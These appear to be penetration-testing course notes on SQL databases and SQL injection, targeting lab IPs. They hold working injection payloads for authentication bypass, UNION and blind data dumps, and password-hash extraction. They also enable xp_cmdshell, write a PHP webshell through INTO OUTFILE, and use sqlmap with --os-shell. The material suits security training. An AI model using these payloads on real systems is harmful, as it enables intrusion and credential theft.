---
tags: sqlmap
---
## DB types and variants

Two main types:
- MySQL (port 3306)
	- MariaDB
- Microsoft SQL Server (MSSQL)

### MySQL

Connect to remote MySQL instance:
`mysql -u root -p'root' -h 192.168.50.16 -P 3306`

Retrieve version:
`select version();` or `select @@version;`

Retrieve current database user:
`select system_user();`

Retrieve list of databases:
`show databases;`

Retrieve all tables in a specific database:
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name';
```

Switch to a database:
```sql
use 'your_database_name'
```

Retrieve all column names in a specific table:
```sql
select column_name from information_schema.columns where table_schema = 'your_db';
```

Example: SELECT for the **user** and **authentication_string** value belonging to the **user** table, then filter for **offsec** user:
```sql
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

### MSSQL
Natively integrated into the Windows ecosystem

Connect to remote MSSQL instance:
`impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
	The `windows-auth` tag forces NTLM authentication (as opposed to Kerberos)

Retrieve version
`SELECT @@version;`

Retrieve user that MSSQL is running as
`select system_user;`

Retrieve all available databases:
```sql
SELECT name FROM sys.databases;
```
Note: *master*, *tempdb*, *model*, and *msdb* are default databases

Retrieve all tables in a database (e.g. `offsec`):
```sql
SELECT * FROM offsec.information_schema.tables;
```

Retrieve all records of a table (e.g. `users`):
```sql
select * from offsec.dbo.users;
```
- `dbo` is the table schema from the previous command

> Note: When using a command line tool (e.g. sqlcmd), we must submit our SQL statement with a `;` followed by a `GO` on the next line, but we can omit `GO` when running remotely.

### PostgreSQL

Connect:
`psql -U [username] -h 127.0.0.1`

List all databases:
`\l`

Switch to a database:
`\c <database_name>`

List tables in the current database:
`\dt`

Extract data from a specific table:
`SELECT * FROM <table_name>;`

Dumping Hashes
`SELECT usename, passwd FROM pg_shadow;`

## Manual SQL exploitation

> To test for SQLi, insert any special character (e.g. `'`). If SQL error message is returned, or we're able to retrieve the database content of our query inside the web application, it is called "in-band" SQLi and it is considered a security flaw.

Example: authentication bypass
- PHP code: `$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";`
- Payload: set the *uname* value to `' OR 1=1 -- //`
	- `--` is comment separator
	- `//` is for preventing any whitespace truncation by web app
- Will return the first user ID present in the database, because `1=1` is always true

If in-band, 
- can use `' or 1=1 in (select @@version) -- //` to retrieve MySQL version in the returned error message.
- dump all data inside *users* table: `' OR 1=1 in (SELECT * FROM users) -- //`
- dump a column *password* inside *users* table: `' or 1=1 in (SELECT password FROM users) -- //`
- specify which user's password to retrieve: `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
- discover number of columns in table: `' ORDER BY 1-- //` (if the number in the query is greater than the number of columns, an error is returned)

### UNION-based payloads

> Enables execution of an extra SELECT statement, concatenating two queries in one statement

Conditions:
1. The injected UNION query must have the same number of columns as the original query
2. The data types must be compatible between the two columns

Note that you need to know the number of columns in the original query.

Example: web app returns the result of the query
- `' UNION SELECT null, null, database(), user(), @@version -- //`
	- Use `null` to shift enumerating functions to avoid type mismatches
	- Note that `%` is used as a wildcard in LIKE
- Enumerate *information_schema* of current database: `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
	- To enumerate another database, replace `database()` with `'another_database_name'`
- Dump table (use the table name and column names obtained from above enumeration): `' UNION SELECT null, username, password, description, null FROM users -- //`
- Enumerate all database names: `UNION SELECT null, schema_name, null, null, null, null from information_schema.schemata ;-- `

### Blind SQLi

> Blind SQLi: Database responses are never returned and behavior is inferred using either boolean- or time-based logic

Example: Boolean-based attack
``http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //`

Example: Enumerate username using time-based attack
`http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`
	If the user is active, the application hangs for 3 seconds

## Manual and automated code execution

### Manual code execution

#### MSSQL

`xp_cmdshell` function takes a string and passess it to the command shell for execution. 
- Returns any output as rows of text
- Is disabled by default. If enabled, must be called with EXECUTE keyword
Example: `EXECUTE xp_cmdshell 'whoami';`

Enable *xp_cmdshell*:
1. `EXECUTE sp_configure 'show advanced options', 1;`
2. `RECONFIGURE;`
3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
4. `RECONFIGURE;`

#### MySQL

No single function to escalate to RCE

Abusing SELECT INTO_OUTFILE statement to write files on server:
- Condition: File location must be writeable to the OS user running the database software
- `' UNION SELECT "[insert php webshell here]", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
- Note: If an error is returned related to incorrect return type, it should not impact writing the file.
- a php webshell: `<?php system($_GET['cmd']);?>`

### Automated code execution

> sqlmap is NOT stealthy as it generates a large amount of traffic

`sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`
- `-u` to specify URL to scan
- `-p` to specify parameter to test

Dump entire database: 
`sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`

POST request and full interactive shell:
1. Intercept POST request in Burp and save it to a text file
2. `sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"`
	- `-r`: specify the file containing the POST requst
	- `--os-shell`: inject full interactive shell
	- `--web-root`: specify the folder to write the shell to
3. When prompted, specify the language the web application is written in (e.g. php)





